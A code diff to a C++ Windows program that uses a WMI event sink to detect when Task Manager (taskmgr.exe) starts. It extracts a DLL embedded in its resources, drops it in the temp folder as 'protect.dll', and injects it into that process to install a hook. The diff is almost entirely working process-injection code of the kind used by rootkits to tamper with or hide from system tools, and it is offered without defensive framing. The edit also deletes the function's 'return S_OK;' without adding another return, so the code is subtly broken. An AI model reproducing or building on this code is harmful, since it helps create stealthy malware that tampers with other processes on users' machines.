@@ -1,6 +1,9 @@
 #include <windows.h>
 #include <wbemidl.h>
 #include <comdef.h>
+#include "resource.h"
+#include "injection.h"
+
 #pragma comment(lib, "wbemuuid.lib")
 
 // ── Sink implementation ──────────────────────────────────────────
@@ -36,8 +39,7 @@ public:
     {
         // inject here. ill manually map a dll here later for now loadlibrary
         // apObjArray contains event data including PID
-
-
+        DWORD pid = 0;
 
         for (LONG i = 0; i < lObjectCount; i++) {
             VARIANT vtPid;
@@ -45,13 +47,37 @@ public:
 
             // get the PID of the new process
             apObjArray[i]->Get(L"ProcessID", 0, &vtPid, nullptr, nullptr);
-            DWORD pid = vtPid.uintVal;
+            pid = vtPid.uintVal;
             VariantClear(&vtPid);
 
-            printf("[+] taskmgr.exe started with PID: %d\n", pid);
-            // TODO: inject your hook DLL into pid
         }
-        return S_OK;
+        
+        // 1. Find the resource
+        HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+        // 2. Load it into memory
+        HGLOBAL hGlobal = LoadResource(NULL, hRes);
+        // 3. Get pointer to the data
+        PVOID pData = LockResource(hGlobal);
+        // 4. Get the size
+        DWORD size = SizeofResource(NULL, hRes);
+
+        // writing it to disk for now.
+        WCHAR tempPath[MAX_PATH];
+        GetTempPathW(MAX_PATH, tempPath);
+        wcscat_s(tempPath, MAX_PATH, L"protect.dll");
+
+        HANDLE hFile = CreateFileW(tempPath, GENERIC_WRITE, 0, NULL,
+            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) return S_OK;
+
+        DWORD written;
+        WriteFile(hFile, pData, size, &written, NULL);
+        CloseHandle(hFile);
+
+        remote_inject(pid, tempPath);
+
+
+
     }
 
     HRESULT STDMETHODCALLTYPE SetStatus(
